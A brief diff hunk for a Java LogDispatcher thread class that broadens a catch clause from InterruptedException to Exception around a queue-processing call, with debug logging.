@@ -175,7 +175,7 @@ public class LogDispatcher extends Thread implements Runnable {
 				}
 
 				processQueue();
-			} catch (final InterruptedException e) {
+			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
 					Check.log(e);
 				}
